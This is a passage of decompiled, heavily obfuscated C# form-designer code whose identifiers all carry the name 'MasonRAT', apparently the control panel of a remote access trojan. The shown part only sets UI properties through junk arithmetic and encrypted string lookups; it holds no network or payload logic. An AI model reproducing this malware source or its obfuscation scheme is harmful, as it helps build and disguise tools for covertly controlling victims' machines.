+ 0) << 0) - ((-1915257651 - (979253096 >> 1698366881) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) << ((-1619213533 ^ ~919368789) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), ((963939403 ^ 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ (-1307903327 ^ ~1693040408) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 << (-1736081687 - 808389792 % 2053349995 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.HoverState.ForeColor = Color.FromArgb((523382526 + 1590283967 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - (-1721993245 - 803355505 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 | 1759057621 - 721371563 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0), (659758282 + (2144998955 << 2037787986) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 ^ (244258593 - -693634502 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 | (386222458 > 1835451932 ? -1873882984 : 1815813234) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (424226391 + 1962702232 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) - -((823322077 | 1568037777) - 196911937 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0));
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 246));
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Location = new Point((-1835413909 - -1281933134 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) - ~(1027717903 - 474236992 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1), 4);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 247);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.ShadowDecoration.BorderRadius = (898973610 + (966325064 >> 965669432) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) - ((1376291080 ^ (110737040 | 1738347606)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.ShadowDecoration.Color = Color.FromArgb(-2048789241 - (2095439420 >> 2107352078) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + (-1533618447 - 712431654 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, 1763607103 + 1528850075 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + ((1002510302 ^ 1976248105 >> 102217304) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) % ((1066914242 > 632852348 ? 2048632944 : -1563456704) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), (34177421 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + -(579809501 - 545632242 % 1700098242 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.ShadowDecoration.Depth = ((335544330 /*0x1400000A*/ ^ 2076956170 << 1436916441) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ (844060269 << 1261505768) - 1075924704 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 >> (161051149 - (76440846 << 1433697120) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Size = new Size((1990710486 - (1675003926 | 919237499) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + (-740704834 - (333590722 << 1115136467) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 >> (1856850183 + -1095203201 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), 33);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.TabIndex = (1987030717 - 1543566289 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ (-1833919888 - 557618533 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) % (486654880 - (1847760700 >> 610721913) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 248);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Animated = true;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.BorderColor = Color.FromArgb(172189523 + ~422652501 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + ((570476543 | 610790998) - 393882803 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), 0 + ((1910911819 + 131251573 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) >> (1501737089 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), ((604249122 > 399012307 ? 565681886 : 754242514) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 > (1891938075 ^ (185162324 | 2039836808)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ? (1939283897 > 1692780410 ? 156 : 208 /*0xD0*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 : 1192534257 + ~1192534048 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.BorderRadius = (1435153882 > 320083585 ? 744064550 : 992086066) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 - (743910464 + (315558406 >> 1916438091) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.BorderThickness = (508381288 + ~1470947935 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ -(1244512109 + -281945463 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Cursor = Cursors.IBeam;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.DefaultText = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 249);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.DisabledState.BorderColor = Color.FromArgb(((442057612 > 838842439 ? 1773048322 : 1329786242) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + -(692275336 + 637510781 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 1211386551 - 1364250297 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + (-2036636550 - (2080792388 | 24958703) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1, (-224935401 - (544642264 << 1034249891) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) - -(2072829725 - (1785184468 | 172816843) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.DisabledState.FillColor = Color.FromArgb(225750332 - (1340331760 >> 1998793710) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 - ((-1587796420 ^ 1588641069 << 823132742) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), ((1441586876 > 1630485649 ? 356753533 : 267565150) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 > 1077511290 - 558630277 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 ? (29384 ^ 960805455 >> 1003237551) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 : 1618143318 - 1618143269 % 1777223574 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, ((-1611015624 ^ 1834362765 << 1362682525) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - (1371556830 - 1201566583 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 | 937024404 - (1046134213 >> 1593285781) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.DisabledState.ForeColor = Color.FromArgb((639812315 + (806907758 | 169449232) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) - ((-1875066404 ^ 1090813214 << 809249627) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (-1991245687 - (1848003200 << 829089869) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ (1769992334 ^ 1586813050 << 1436964482) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 << ((515641193 ^ 526624327 >> 761660427) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, (-401510592 - 672231083 % 1942286295 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ ((258892283 > 1575712014 ? 1912136254 : 1434102191) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) 